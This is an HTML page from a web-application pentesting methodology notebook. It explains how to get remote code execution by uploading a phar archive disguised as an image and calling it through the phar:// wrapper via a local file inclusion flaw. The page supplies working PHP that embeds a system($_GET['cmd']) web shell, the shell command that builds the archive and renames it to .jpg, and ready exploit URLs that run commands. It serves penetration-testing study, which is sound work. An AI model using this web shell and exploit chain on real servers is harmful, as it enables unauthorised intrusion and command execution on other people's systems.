<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Phar Upload & Phar Wrapper</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Phar Upload & Phar Wrapper</h1><br/><br />If <a href="Test_Methodology--WebApp_Pentest--Exploitation--Server-side--File_Inclusion--Remote_Code_Execution_(RCE)--LFI_-_File_Upload--Image_Upload.html">LFI/File Upload → Image Upload</a> does not work <span style="text-decoration:underline;">but the fuction in the backend is vulnerable</span> since allow code execution, we can try with:<br />• ZIP Upload &amp; ZIP Wrapper<br />• Phar Upload &amp; Phar Wrapper<br />These techniques may become handy in some specific cases where <a href="Test_Methodology--WebApp_Pentest--Exploitation--Server-side--File_Inclusion--Remote_Code_Execution_(RCE)--LFI_-_File_Upload--Image_Upload.html">LFI/File Upload → Image Upload</a> does not work.  It anyway usually is more reliable<br /><br /><strong><h3>Phar Upload &amp; Phar Wrapper</h3></strong><br />We can utilize the <a href="https://www.php.net/manual/en/wrappers.phar.php">phar</a> wrapper to execute PHP code<br /><br />1. create a PHP web shell script  (example: shell.php) and wrap inside it another file (example: shell.txt):	<br />	<span style="color:#865e3c;">example:</span> PHP file shell.php<br />	<div class="codebox"><pre>&lt;?php<br /><span style="color:#7f0044;font-weight:400">$phar</span> = new Phar<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;shell.phar&#39;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#7f0044;font-weight:400">$phar</span>-&gt;<span style="color:#ffdd00;font-weight:400">startBuffering()</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#7f0044;font-weight:400">$phar</span>-&gt;addFromString<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;shell.txt&#39;</span>, <span style="color:#3ad900;font-weight:400">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#7f0044;font-weight:400">$phar</span>-&gt;setStub<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#7f0044;font-weight:400">$phar</span>-&gt;<span style="color:#ffdd00;font-weight:400">stopBuffering()</span><span style="color:#ff9d00;font-weight:700">;</span><br />?&gt;</pre></div><br />	when the .phar file (example: shell.php) will be called it will write a web shell to a another sub-file (example: shell.txt), which we can interact with<code><br /></code><br />2. compile the .php file (example: shell.php)  into a phar file (example: shell.phar) and rename it with an image extension (example: shell.jpg)<br />	<div class="codebox"><pre>$ php --define phar.readonly=0 shell.php <span style="color:#ff9d00;font-weight:700">&amp;&amp;</span> <span style="color:#ff9d00;font-weight:700">mv</span> shell.phar shell.jpg</pre></div><code><br /></code><br />3. Upload the phar file renamed with an image extension (example: shell.jpg) to the web application<br />4. Call the phar file renamed with an image extension (example: shell.jpg) <br />   1) with <code>phar://</code> and provide its URL path<br />   2) specify the phar sub-file with <code>/shell.txt</code> → URL encoded →  <code>%2Fshell.txt&amp;</code><br />   3) to specify a command to execute we add (<code>&amp;cmd=id</code>)<br />   <div class="codebox"><pre>http<span style="color:#ff9d00;font-weight:700">://</span>&lt;SERVER_IP&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;PORT&gt;<span style="color:#ff9d00;font-weight:700">/</span>index.php?language=phar<span style="color:#ff9d00;font-weight:700">://</span>.<span style="color:#ff9d00;font-weight:700">/</span>profile_images<span style="color:#ff9d00;font-weight:700">/</span>shell.jpg%2Fshell.txt<span style="color:#ff9d00;font-weight:700">&amp;</span>cmd=<span style="color:#ff9d00;font-weight:700">id</span></pre></div><br />   <div class="codebox"><pre>http<span style="color:#ff9d00;font-weight:700">://</span>&lt;SERVER_IP&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;PORT&gt;<span style="color:#ff9d00;font-weight:700">/</span>index.php?language=phar<span style="color:#ff9d00;font-weight:700">://</span>profile_images<span style="color:#ff9d00;font-weight:700">/</span>shell.jpg%2Fshell.txt<span style="color:#ff9d00;font-weight:700">&amp;</span>cmd=<span style="color:#ff9d00;font-weight:700">id</span></pre></div><br />   <br /><br /><br /><h3>As we can see, the </h3><code><h3>id</h3></code><h3> command was successfully executed. Both the </h3><code><h3>zip</h3></code><h3> and </h3><code><h3>phar</h3></code><h3> wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.</h3><br /><strong><h3>Note:</h3></strong><h3> There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the </h3><code><h3>phpinfo()</h3></code><h3> page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to </h3><a href="https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf">This Link</a><h3>.</h3><br /><br /><strong>Bibliography:</strong><br /><a href="https://www.php.net/manual/en/wrappers.phar.php">https://www.php.net/manual/en/wrappers.phar.php</a></div>
</body>
</html>
